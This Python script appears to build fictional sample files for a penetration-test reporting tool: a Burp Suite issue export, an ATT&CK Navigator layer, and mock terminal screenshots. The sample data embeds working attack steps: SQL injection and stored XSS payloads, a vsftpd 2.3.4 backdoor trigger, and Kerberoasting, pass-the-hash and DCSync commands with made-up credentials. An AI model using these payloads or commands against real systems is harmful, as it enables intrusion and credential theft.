"""Generate the non-scan sample files: a Burp Suite issue export, an ATT&CK
Navigator layer, and four evidence screenshots.

Writes into sample_data/files/:
    acme_intranet_burp.xml      Burp Suite "Report issues" XML (importable)
    acme_attack_layer.json      ATT&CK Navigator layer (Test Plans -> Layers)
    shot_*.png                  evidence screenshots, rendered from HTML

Everything is fictional: the acme.local domain, private 10.0.5.0/24 addresses,
and made-up accounts, passwords and hashes. The screenshots are drawn from the
small HTML templates below, so they can be regenerated and edited.

Usage from the repo root (needs Playwright's Chromium, which the browser tests
already use: `python -m playwright install chromium-headless-shell`):
    ./venv/bin/python sample_data/build_assets.py
"""

import html
import json
from pathlib import Path
from xml.dom import minidom
import xml.etree.ElementTree as ET

FILES = Path(__file__).resolve().parent / "files"

# ---------------------------------------------------------------------------
# Burp Suite issue export: the intranet portal on WEB-INT01 (10.0.5.19)
# ---------------------------------------------------------------------------
BURP_HOST = "https://intranet.acme.local"
BURP_IP = "10.0.5.19"

BURP_ISSUES = [
    {
        "type": "1049088", "name": "SQL injection", "path": "/directory/search",
        "location": "/directory/search [q parameter]", "severity": "High", "confidence": "Certain",
        "detail": (
            "The <b>q</b> parameter appears to be vulnerable to SQL injection attacks. "
            "The payload <b>'||pg_sleep(10)--</b> was submitted in the q parameter and the "
            "application took 10,214 milliseconds to respond, compared with 188 milliseconds "
            "for the original request. A UNION-based payload returned the database version "
            "(PostgreSQL 14.5) in the employee table."
        ),
        "remediation": (
            "Use parameterised queries for every database call. The directory search builds "
            "its WHERE clause by string concatenation in <b>search.py</b>."
        ),
    },
    {
        "type": "2097920", "name": "Cross-site scripting (stored)", "path": "/profile/edit",
        "location": "/profile/edit [about_me parameter]", "severity": "High", "confidence": "Firm",
        "detail": (
            "The value of the <b>about_me</b> parameter is stored and later rendered unencoded "
            "on <b>/directory/person/&lt;id&gt;</b>. The payload "
            "<b>&lt;img src=x onerror=alert(document.domain)&gt;</b> executed when another "
            "user viewed the profile."
        ),
        "remediation": "HTML-encode user input on output and add a Content-Security-Policy.",
    },
    {
        "type": "5244416", "name": "Cookie without HttpOnly flag set", "path": "/login",
        "location": "/login", "severity": "Low", "confidence": "Certain",
        "detail": "The session cookie <b>PORTALSESSID</b> is issued without the HttpOnly flag.",
        "remediation": "Set HttpOnly (and Secure, SameSite=Lax) on the session cookie.",
    },
    {
        "type": "4194560", "name": "Password field with autocomplete enabled", "path": "/login",
        "location": "/login", "severity": "Low", "confidence": "Certain",
        "detail": "The login form's password field does not set autocomplete=\"off\".",
        "remediation": "Rely on a password manager-friendly policy; low priority.",
    },
    {
        "type": "8389632", "name": "Strict transport security not enforced", "path": "/",
        "location": "/", "severity": "Low", "confidence": "Certain",
        "detail": "The application does not send a Strict-Transport-Security header.",
        "remediation": "Send Strict-Transport-Security: max-age=31536000; includeSubDomains.",
    },
    {
        "type": "5245344", "name": "Software version disclosed in Server header", "path": "/",
        "location": "/", "severity": "Information", "confidence": "Certain",
        "detail": "Responses include <b>Server: nginx/1.18.0 (Ubuntu)</b>.",
        "remediation": "Set server_tokens off in the nginx configuration.",
    },
]


def build_burp():
    root = ET.Element("issues", burpVersion="2026.4.1", exportTime="Wed May 06 15:42:10 UTC 2026")
    for n, issue in enumerate(BURP_ISSUES, start=1):
        el = ET.SubElement(root, "issue")
        for tag, text in [
            ("serialNumber", f"58291740{n:04d}"),
            ("type", issue["type"]),
            ("name", issue["name"]),
        ]:
            ET.SubElement(el, tag).text = text
        host = ET.SubElement(el, "host", ip=BURP_IP)
        host.text = BURP_HOST
        for tag, text in [
            ("path", issue["path"]),
            ("location", issue["location"]),
            ("severity", issue["severity"]),
            ("confidence", issue["confidence"]),
            ("issueDetail", issue["detail"]),
            ("remediationDetail", issue["remediation"]),
        ]:
            ET.SubElement(el, tag).text = text
    pretty = minidom.parseString(ET.tostring(root, encoding="utf-8")).toprettyxml(indent="  ", encoding="utf-8")
    (FILES / "acme_intranet_burp.xml").write_bytes(pretty)


# ---------------------------------------------------------------------------
# ATT&CK Navigator layer: the techniques used in this engagement
# ---------------------------------------------------------------------------
LAYER_TECHNIQUES = [
    ("T1046", "Network Service Discovery", 60, "Nmap sweep of 10.0.5.0/24"),
    ("T1190", "Exploit Public-Facing Application", 90, "SQL injection on the intranet portal"),
    ("T1078", "Valid Accounts", 80, "Reused portal_app password on HR-DB; Tomcat default creds"),
    ("T1505.003", "Web Shell", 70, "WAR deployed through Tomcat Manager on ERP-APP01"),
    ("T1558.003", "Kerberoasting", 100, "svc_sql TGS cracked offline"),
    ("T1003.001", "LSASS Memory", 100, "LSASS dump on SQL-PROD01"),
    ("T1003.006", "DCSync", 100, "secretsdump against DC01"),
    ("T1550.002", "Pass the Hash", 90, "adm_jsmith NTLM hash reused to DC01"),
    ("T1021.002", "SMB/Windows Admin Shares", 70, "psexec to SQL-PROD01 and DC01"),
    ("T1059.001", "PowerShell", 50, "Post-exploitation enumeration"),
    ("T1087.002", "Domain Account", 50, "BloodHound collection"),
    ("T1110.002", "Password Cracking", 60, "hashcat against the TGS and NTLM hashes"),
]


def build_layer():
    layer = {
        "name": "ACME Corp sample engagement",
        "versions": {"attack": "16", "navigator": "5.1.0", "layer": "4.5"},
        "domain": "enterprise-attack",
        "description": "Techniques used during the ACME Corp sample engagement (fictional).",
        "techniques": [
            {"techniqueID": tid, "score": score, "color": "", "comment": comment,
             "enabled": True, "metadata": [], "showSubtechniques": False}
            for tid, _name, score, comment in LAYER_TECHNIQUES
        ],
        "gradient": {"colors": ["#ffffffff", "#ff6666ff"], "minValue": 0, "maxValue": 100},
        "legendItems": [],
        "showTacticRowBackground": False,
        "selectTechniquesAcrossTactics": True,
    }
    (FILES / "acme_attack_layer.json").write_text(json.dumps(layer, indent=2) + "\n")


# ---------------------------------------------------------------------------
# Screenshots, rendered from HTML with headless Chromium
# ---------------------------------------------------------------------------
TERMINAL_CSS = """
body { margin: 0; background: #1e1f24; font: 15px/1.45 Menlo, 'DejaVu Sans Mono', monospace; color: #d6d8de; }
.bar { background: #2c2e35; color: #9aa0ab; padding: 8px 14px; font: 13px -apple-system, Helvetica, Arial, sans-serif; }
.bar b { color: #d6d8de; }
pre { margin: 0; padding: 16px 18px; white-space: pre-wrap; }
.p { color: #7fd17f; } .c { color: #e6e6e6; font-weight: bold; } .r { color: #ff7b72; }
.y { color: #f2cc60; } .d { color: #7d8590; }
"""

SHOTS = {
    "shot_vsftpd_root.png": ("kali@attack-box: ~", """\
<span class="p">kali@attack-box</span>:<span class="y">~</span>$ <span class="c">nc 10.0.5.26 21</span>
220 (vsFTPd 2.3.4)
USER probe:)
331 Please specify the password.
PASS anything
<span class="d">^C</span>
<span class="p">kali@attack-box</span>:<span class="y">~</span>$ <span class="c">nc 10.0.5.26 6200</span>
<span class="c">id; hostname; uname -r</span>
uid=0(root) gid=0(root) groups=0(root)
FTP-LEGACY
2.6.32-754.el6.x86_64
<span class="c">grep -c . /etc/shadow</span>
31
<span class="r"># backdoor shell on 6200/tcp: root without credentials</span>
"""),
    "shot_sqli_union.png": ("HTTP request / response: intranet.acme.local", """\
<span class="d">--- request ---</span>
<span class="c">GET /directory/search?q=zz'+UNION+SELECT+usename,passwd,null,null+FROM+pg_shadow-- HTTP/1.1</span>
Host: intranet.acme.local
Cookie: PORTALSESSID=8c1e0f6a2b7d4e19a3c5
<span class="d">--- response ---</span>
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=utf-8

&lt;tr&gt;&lt;td&gt;<span class="r">portal_app</span>&lt;/td&gt;&lt;td&gt;<span class="r">SCRAM-SHA-256$4096:Zm9vYmFy...</span>&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;postgres&lt;/td&gt;&lt;td&gt;SCRAM-SHA-256$4096:YmF6cXV4...&lt;/td&gt;&lt;/tr&gt;
<span class="d"># portal_app password recovered from /var/www/portal/.env via the same injection:</span>
<span class="y">DATABASE_URL=postgresql://portal_app:Intr4net!2024@10.0.5.29/hr</span>
"""),
    "shot_kerberoast.png": ("kali@attack-box: ~/acme", """\
<span class="p">kali@attack-box</span>:<span class="y">~/acme</span>$ <span class="c">GetUserSPNs.py acme.local/j.doe:'Welcome2026!' -dc-ip 10.0.5.10 -request</span>
ServicePrincipalName                  Name     MemberOf                              PasswordLastSet
------------------------------------  -------  ------------------------------------  -------------------
MSSQLSvc/SQL-PROD01.acme.local:1433   svc_sql  CN=SQL Admins,OU=Groups,DC=acme,DC=local  2019-03-11 09:14:02

$krb5tgs$23$*svc_sql$ACME.LOCAL$acme.local/svc_sql*$5c1f...<span class="d">(truncated)</span>
<span class="p">kali@attack-box</span>:<span class="y">~/acme</span>$ <span class="c">hashcat -m 13100 svc_sql.tgs rockyou.txt -r best64.rule</span>
...
$krb5tgs$23$*svc_sql$ACME.LOCAL$...:<span class="r">Summer2019!</span>
Status...........: <span class="p">Cracked</span>
Time.Started.....: 0 secs  Speed.#1: 1843.2 MH/s
"""),
    "shot_dcsync.png": ("kali@attack-box: ~/acme", """\
<span class="p">kali@attack-box</span>:<span class="y">~/acme</span>$ <span class="c">secretsdump.py -hashes :8f3c2a91d04b7e65c1a9f0e3d2b4c6a8 acme.local/adm_jsmith@10.0.5.10 -just-dc-user krbtgt</span>
Impacket - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
<span class="r">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2b7e4d9a6c13f05e8a1d3c7b9f2e6a40:::</span>
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:4f1e...<span class="d">(truncated)</span>
[*] Cleaning up...
<span class="y"># Domain Admin equivalent: DCSync of krbtgt from a pass-the-hash session</span>
"""),
}


def build_screenshots():
    from playwright.sync_api import sync_playwright

    with sync_playwright() as pw:
        browser = pw.chromium.launch()
        page = browser.new_page(viewport={"width": 1100, "height": 100}, device_scale_factor=1)
        for name, (title, body) in SHOTS.items():
            page.set_content(
                f"<!doctype html><meta charset=utf-8><style>{TERMINAL_CSS}</style>"
                f"<div class=bar><b>{html.escape(title)}</b></div><pre>{body}</pre>"
            )
            page.screenshot(path=str(FILES / name), full_page=True)
        browser.close()


def main():
    FILES.mkdir(parents=True, exist_ok=True)
    build_burp()
    build_layer()
    build_screenshots()
    for p in sorted(FILES.iterdir()):
        print(f"[OK] {p.relative_to(FILES.parent.parent)} ({p.stat().st_size:,} bytes)")


if __name__ == "__main__":
    main()
